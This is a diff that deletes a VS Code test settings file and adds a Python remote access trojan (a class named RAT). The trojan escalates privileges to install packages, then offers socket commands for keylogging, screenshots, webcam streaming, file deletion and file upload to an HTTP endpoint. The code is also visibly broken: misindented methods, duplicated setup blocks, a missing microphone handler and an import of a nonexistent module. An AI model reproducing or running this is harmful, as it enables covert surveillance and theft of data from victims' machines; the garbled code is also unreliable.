@@ -1,11 +1,312 @@
-{
-    "python.testing.unittestArgs": [
-        "-v",
-        "-s",
-        ".",
-        "-p",
-        "*test.py"
-    ],
-    "python.testing.pytestEnabled": false,
-    "python.testing.unittestEnabled": true
-}
+import urllib.request
+import os
+import subprocess
+import sys
+import urllib.error
+
+# Check if pip is installed
+try:
+    import pip
+except ImportError:
+    # Check if get-pip.py exists
+    if not os.path.exists("get-pip.py"):
+        print("Downloading get-pip.py...")
+        try:
+            urllib.request.urlretrieve(
+                "https://bootstrap.pypa.io/get-pip.py", "get-pip.py"
+            )
+        except urllib.error.URLError:
+            print("Failed to download get-pip.py.")
+            sys.exit(1)
+    # Install pip with sudo
+    print("Installing pip...")
+    try:
+        os.system("sudo python get-pip.py")
+    except subprocess.CalledProcessError:
+        print("Failed to install pip.")
+        sys.exit(1)
+
+import subprocess
+import sys
+
+try:
+    subprocess.check_call([sys.executable, "-m", "pip", "--version"])
+except subprocess.CalledProcessError:
+    print("pip not found, installing...")
+    try:
+        subprocess.check_call([sys.executable, "get-pip.py"])
+    except subprocess.CalledProcessError:
+        print("Failed to install pip.")
+        sys.exit(1)
+
+print("pip is installed.")
+
+import sys
+import subprocess
+
+
+def install(package):
+    try:
+        subprocess.check_call([sys.executable, "-m", "pip", "install", package])
+    except subprocess.CalledProcessError:
+        print(f"Failed to install {package}.")
+        sys.exit(1)
+
+
+required_modules = [
+    "keyboard",
+    "numpy",
+    "opencv-python-headless",
+    "psutil",
+    "pyaudio",
+    "pyscreenshot",
+    "requests",
+    "cryptography",
+]
+
+# Detect operating system and escalate privilege if running on Windows
+if os.name == "nt":
+    print(
+        "Running on Windows. Escalating privilege to install pip and required modules..."
+    )
+    try:
+        subprocess.check_call(
+            ["runas", "/user:Administrator", "cmd", "/c", "python get-pip.py"]
+        )
+    except subprocess.CalledProcessError:
+        print(
+            "Failed to escalate privilege. Please run the script as an administrator and try again."
+        )
+        sys.exit(1)
+
+    for module in required_modules:
+        try:
+            __import__(module)
+        except ImportError:
+            try:
+                subprocess.check_call(
+                    [
+                        "runas",
+                        "/user:Administrator",
+                        "cmd",
+                        "/c",
+                        f"python -m pip install {module}",
+                    ]
+                )
+            except subprocess.CalledProcessError:
+                print(f"Failed to install {module}.")
+                sys.exit(1)
+else:
+    # Check if pip is installed
+    try:
+        import pip
+    except ImportError:
+        # Check if get-pip.py exists
+        if not os.path.exists("get-pip.py"):
+            print("Downloading get-pip.py...")
+            urllib.request.urlretrieve(
+                "https://bootstrap.pypa.io/get-pip.py", "get-pip.py"
+            )
+        # Install pip with sudo
+        print("Installing pip...")
+        os.system("sudo python get-pip.py")
+
+    try:
+        subprocess.check_call([sys.executable, "-m", "pip", "--version"])
+    except subprocess.CalledProcessError:
+        print("pip not found, installing...")
+        try:
+            subprocess.check_call([sys.executable, "get-pip.py"])
+        except subprocess.CalledProcessError:
+            print("Failed to install pip.")
+            sys.exit(1)
+
+    print("pip is installed.")
+
+    for module in required_modules:
+        try:
+            __import__(module)
+        except ImportError:
+            try:
+                subprocess.check_call(["sudo", "pip", "install", module])
+            except subprocess.CalledProcessError:
+                print(f"Failed to install {module}.")
+                sys.exit(1)
+
+import socket
+import subprocess
+import os
+import sys
+import shutil
+import time
+import threading
+import platform
+import base64
+import cv2
+import pyscreenshot as ImageGrab
+import pyaudio
+import wave
+import json
+import requests
+import keyboard
+import numpy as np
+import psutil
+from cryptography.fernet import Fernet
+from keylogger import keylogger
+
+
+class RAT:
+    def __init__(self, host, port, key):
+        self.host = host
+        self.port = port
+        self.client_list = []
+        self.clients = {}
+        self.commands = {
+            "keylogger": self.keylogger,
+            "screenshot": self.screenshot,
+            "webcam": self.webcam,
+            "microphone": self.microphone,
+            "delete_file": self.delete_file,
+            "download_file": self.download_file,
+            "upload_file": self.upload_file,
+        }
+        self.key = key.encode()
+        self.fernet = Fernet(self.key)
+
+    def accept_clients(self):
+        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.sock.bind((self.host, self.port))
+        self.sock.listen(5)
+        print(f"Listening for connections on {self.host}:{self.port}")
+        while True:
+            client, address = self.sock.accept()
+            client_ip = address[0]
+            self.client_list.append(client_ip)
+            print(f"Connection established with {client_ip}")
+            self.clients[client_ip] = client
+            client_thread = threading.Thread(
+                target=self.receive_commands, args=(client,)
+            )
+            client_thread.daemon = True
+            client_thread.start()
+
+    def receive_commands(self, client):
+        while True:
+            try:
+                command = client.recv(1024)
+                decrypted_command = self.fernet.decrypt(command).decode()
+                if decrypted_command.strip() == "exit":
+                    client.close()
+                    return
+                elif decrypted_command.strip() == "help":
+                    client.send(str(self.commands.keys()).encode("utf-8"))
+                elif decrypted_command.strip() in self.commands.keys():
+                    self.commands[decrypted_command.strip()](client)
+                else:
+                    client.send(self.fernet.encrypt("Invalid command".encode("utf-8")))
+            except:
+                client.close()
+                return
+
+
+def download_file(self, client):
+    while True:
+        try:
+            file_url = client.recv(1024).decode()
+            if file_url.strip() == "exit":
+                return
+            response = requests.get(file_url, stream=True)
+            filename = file_url.split("/")[-1]
+            with open(filename, "wb") as f:
+                for chunk in response.iter_content(chunk_size=1024):
+                    if chunk:
+                        f.write(chunk)
+            response = f"File {filename} downloaded successfully"
+            client.send(self.fernet.encrypt(response.encode("utf-8")))
+        except Exception as e:
+            print(f"Exception: {e}")
+            client.close()
+            return
+
+
+def upload_file(self, client):
+    while True:
+        try:
+            file_path = client.recv(1024).decode()
+            if file_path.strip() == "exit":
+                return
+            with open(file_path, "rb") as f:
+                file_data = f.read()
+            file_name = file_path.split("/")[-1]
+            payload = {"file": (file_name, file_data)}
+            response = requests.post("http://localhost:8000/upload", files=payload)
+            response_text = response.text.encode("utf-8")
+            client.send(self.fernet.encrypt(response_text))
+        except Exception as e:
+            print(f"Exception: {e}")
+            client.close()
+
+
+def keylogger(self, client):
+    log = ""
+    try:
+        while True:
+            key = keyboard.read_event()
+            log += str(key)
+            if len(log) > 1024:
+                encrypted_log = self.fernet.encrypt(log.encode("utf-8"))
+                client.send(encrypted_log)
+                log = ""
+    except Exception as e:
+        print(f"Exception: {e}")
+    finally:
+        client.close()
+
+    def screenshot(self, client):
+        screenshot = ImageGrab.grab()
+        screenshot.save("screenshot.png")
+        with open("screenshot.png", "rb") as f:
+            screenshot_data = f.read()
+        encrypted_screenshot_data = self.fernet.encrypt(
+            base64.b64encode(screenshot_data)
+        )
+        client.send(encrypted_screenshot_data)
+
+    def webcam(self, client):
+        cap = cv2.VideoCapture(0)
+        while True:
+            ret, frame = cap.read()
+            if ret:
+                cv2.imshow("webcam", frame)
+                if cv2.waitKey(1) & 0xFF == ord("q"):
+                    break
+                frame_data = cv2.imencode(".jpg", frame)[1].tostring()
+                encrypted_frame_data = self.fernet.encrypt(base64.b64encode(frame_data))
+                client.send(encrypted_frame_data)
+        cap.release()
+        cv2.destroyAllWindows()
+
+    def delete_file(self, client):
+        while True:
+            try:
+                filename = client.recv(1024)
+                decrypted_filename = self.fernet.decrypt(filename).decode().strip()
+                if decrypted_filename == "exit":
+                    client.close()
+                    return
+                elif os.path.exists(decrypted_filename):
+                    os.remove(decrypted_filename)
+                    client.send(
+                        self.fernet.encrypt(
+                            f"{decrypted_filename} has been deleted".encode("utf-8")
+                        )
+                    )
+                else:
+                    client.send(
+                        self.fernet.encrypt(
+                            f"{decrypted_filename} does not exist".encode("utf-8")
+                        )
+                    )
+            except:
+                client.close()
+                return
